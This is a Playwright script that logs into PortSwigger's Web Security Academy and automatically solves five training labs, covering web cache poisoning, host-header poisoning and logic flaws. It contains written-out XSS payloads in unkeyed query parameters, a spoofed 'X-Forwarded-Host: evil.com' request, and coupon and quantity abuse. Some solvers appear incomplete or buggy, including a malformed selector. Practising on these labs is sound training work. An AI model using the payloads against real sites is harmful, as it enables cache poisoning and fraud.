const { chromium } = require('playwright');

const EMAIL = process.env.PORTSWIGGER_EMAIL;
const PASSWORD = process.env.PORTSWIGGER_PASSWORD;

async function launchLab(browser, topic, num) {
  const ctx = await browser.newContext({ viewport: { width: 1280, height: 900 } });
  const page = await ctx.newPage();
  
  // Login
  await page.goto('https://portswigger.net/users', { waitUntil: 'networkidle', timeout: 30000 });
  await page.fill('#EmailAddress', EMAIL);
  await page.fill('#Password', PASSWORD);
  await Promise.all([
    page.waitForNavigation({ timeout: 15000 }).catch(() => {}),
    page.click('#Login'),
  ]);
  await page.waitForTimeout(2000);
  
  // Find lab
  await page.goto('https://portswigger.net/web-security/all-labs', { waitUntil: 'networkidle', timeout: 30000 });
  await page.waitForTimeout(3000);
  
  const labLink = await page.evaluate(({ topic, num }) => {
    const links = [...document.querySelectorAll('.widgetcontainer-lab-link')];
    const topicLinks = links.filter(el => {
      const a = el.querySelector('a');
      return a?.getAttribute('href')?.includes(`/web-security/${topic}/`);
    });
    const target = topicLinks[num - 1];
    if (target?.className.includes('is-solved')) return 'SOLVED';
    return target?.querySelector('a')?.getAttribute('href') || null;
  }, { topic, num });
  
  if (labLink === 'SOLVED') {
    console.log('  ✅ Already solved');
    await ctx.close();
    return { solved: true };
  }
  if (!labLink) {
    console.log('  ❌ Lab not found');
    await ctx.close();
    return null;
  }
  
  // Launch lab
  await page.goto('https://portswigger.net' + labLink, { waitUntil: 'networkidle', timeout: 30000 });
  const launchLink = await page.$('a[href*="labs/launch"]');
  if (!launchLink) { console.log('  ❌ No launch link'); await ctx.close(); return null; }
  
  await page.goto('https://portswigger.net' + (await launchLink.getAttribute('href')), {
    waitUntil: 'domcontentloaded', timeout: 60000,
  });
  await page.waitForTimeout(45000);
  
  const labUrl = page.url();
  if (!labUrl.includes('web-security-academy.net')) {
    console.log('  ❌ Lab did not load');
    await ctx.close();
    return null;
  }
  
  const base = new URL(labUrl).origin;
  console.log(`  Lab URL: ${base}`);
  
  return { page, base, ctx };
}

async function verifySolved(page, base) {
  await page.waitForTimeout(3000);
  const verifyPage = await page.context().newPage();
  await verifyPage.goto(base, { waitUntil: 'domcontentloaded', timeout: 15000 });
  const body = await verifyPage.textContent('body').catch(() => '');
  await verifyPage.close();
  const solved = body?.toLowerCase().includes('congratulations');
  console.log(solved ? '  🎯 SOLVED!' : '  ⬜ Not solved');
  return solved;
}

// ========== Web Cache Poisoning #5 ==========
async function solveWCP5() {
  console.log('\n[WebCachePoisoning#5] Web cache poisoning via an unkeyed query string');
  const browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
  const result = await launchLab(browser, 'web-cache-poisoning', 5);
  if (!result || result.solved) { await browser.close(); return result?.solved || false; }
  
  const { page, base, ctx } = result;
  
  // Poison cache with unkeyed query string
  await page.goto(`${base}/?utm_content=test'><script>alert(1)</script>`, { waitUntil: 'networkidle', timeout: 15000 });
  await page.waitForTimeout(2000);
  
  // Check if cache is poisoned
  await page.goto(base, { waitUntil: 'networkidle', timeout: 15000 });
  await page.waitForTimeout(2000);
  
  const solved = await verifySolved(page, base);
  await ctx.close();
  await browser.close();
  return solved;
}

// ========== Web Cache Poisoning #6 ==========
async function solveWCP6() {
  console.log('\n[WebCachePoisoning#6] Web cache poisoning via an unkeyed query parameter');
  const browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
  const result = await launchLab(browser, 'web-cache-poisoning', 6);
  if (!result || result.solved) { await browser.close(); return result?.solved || false; }
  
  const { page, base, ctx } = result;
  
  // Poison cache with unkeyed parameter
  await page.goto(`${base}/?utm_content='/><script>alert(1)</script>`, { waitUntil: 'networkidle', timeout: 15000 });
  await page.waitForTimeout(2000);
  
  const solved = await verifySolved(page, base);
  await ctx.close();
  await browser.close();
  return solved;
}

// ========== Host Header #3 ==========
async function solveHostHeader3() {
  console.log('\n[HostHeader#3] Web cache poisoning via ambiguous requests');
  const browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
  const result = await launchLab(browser, 'host-header', 3);
  if (!result || result.solved) { await browser.close(); return result?.solved || false; }
  
  const { page, base, ctx } = result;
  
  // Use fetch with custom headers to exploit ambiguous host header
  await page.goto(base, { waitUntil: 'networkidle', timeout: 15000 });
  
  // Try to poison cache via ambiguous request
  try {
    await page.evaluate(async (base) => {
      await fetch(`${base}/resources/js/tracking.js`, {
        headers: {
          'Host': `${base.replace('https://', '')}`,
          'X-Forwarded-Host': 'evil.com',
        },
      });
    }, base);
  } catch (e) {
    // Ignore
  }
  
  await page.waitForTimeout(3000);
  const solved = await verifySolved(page, base);
  await ctx.close();
  await browser.close();
  return solved;
}

// ========== Logic Flaws #5 ==========
async function solveLogicFlaws5() {
  console.log('\n[LogicFlaws#5] Low-level logic flaw');
  const browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
  const result = await launchLab(browser, 'logic-flaws', 5);
  if (!result || result.solved) { await browser.close(); return result?.solved || false; }
  
  const { page, base, ctx } = result;
  
  // Login as Wiener
  await page.goto(`${base}/login`, { waitUntil: 'networkidle', timeout: 15000 });
  await page.fill('input[name="username"]', 'wiener');
  await page.fill('input[name="password"]', 'peter');
  await page.click('button[type="submit"]');
  await page.waitForTimeout(3000);
  
  // Add expensive item to cart with negative quantity or large quantity to overflow
  await page.goto(`${base}/product/1`, { waitUntil: 'networkidle', timeout: 15000 });
  
  // Try adding with large quantity to cause integer overflow
  await page.fill('input[name="quantity"]', '99');
  await page.click('button[type="submit"]');
  await page.waitForTimeout(2000);
  
  // Go to cart and checkout
  await page.goto(`${base}/cart`, { waitUntil: 'networkidle', timeout: 15000 });
  await page.waitForTimeout(1000);
  
  const checkoutBtn = await page.$('a[href="/cart/checkout"]');
  if (checkoutBtn) {
    await checkoutBtn.click();
    await page.waitForTimeout(3000);
  }
  
  const solved = await verifySolved(page, base);
  await ctx.close();
  await browser.close();
  return solved;
}

// ========== Logic Flaws #10 ==========
async function solveLogicFlaws10() {
  console.log('\n[LogicFlaws#10] Infinite money logic flaw');
  const browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
  const result = await launchLab(browser, 'logic-flaws', 10);
  if (!result || result.solved) { await browser.close(); return result?.solved || false; }
  
  const { page, base, ctx } = result;
  
  // Login as Wiener
  await page.goto(`${base}/login`, { waitUntil: 'networkidle', timeout: 15000 });
  await page.fill('input[name="username"]', 'wiener');
  await page.fill('input[name="password"]', 'peter');
  await page.click('button[type="submit"]');
  await page.waitForTimeout(3000);
  
  // Buy gift card and apply coupon repeatedly
  for (let i = 0; i < 5; i++) {
    await page.goto(`${base}/product/2`, { waitUntil: 'networkidle', timeout: 15000 });
    await page.fill('input[name="quantity"]', '1');
    await page.click('button[type="submit"]');
    await page.waitForTimeout(1000);
    
    await page.goto(`${base}/cart`, { waitUntil: 'networkidle', timeout: 15000 });
    
    // Apply coupon if available
    const couponInput = await page.$('input[name="coupon"]]');
    if (couponInput) {
      await couponInput.fill('SIGNUP30');
      await page.click('button[type="submit"]');
      await page.waitForTimeout(1000);
    }
    
    const checkoutBtn = await page.$('a[href="/cart/checkout"]');
    if (checkoutBtn) {
      await checkoutBtn.click();
      await page.waitForTimeout(2000);
    }
  }
  
  const solved = await verifySolved(page, base);
  await ctx.close();
  await browser.close();
  return solved;
}

// ========== MAIN ==========

async function main() {
  console.log('\n  ┌─────────────────────────────────────────┐');
  console.log('  │   PortSwigger Custom Solver Batch 2     │');
  console.log('  └─────────────────────────────────────────┘\n');
  
  const solvers = [
    solveWCP5,
    solveWCP6,
    solveHostHeader3,
    solveLogicFlaws5,
    solveLogicFlaws10,
  ];
  
  let solved = 0, failed = 0;
  
  for (const solver of solvers) {
    try {
      const result = await solver();
      if (result) solved++;
      else failed++;
    } catch (e) {
      console.log(`  ❌ Error: ${e.message}`);
      failed++;
    }
    
    await new Promise(r => setTimeout(r, 5000));
  }
  
  console.log(`\n========================================`);
  console.log(`Result: ${solved} solved, ${failed} failed`);
  console.log(`========================================\n`);
}

main().catch(console.error);
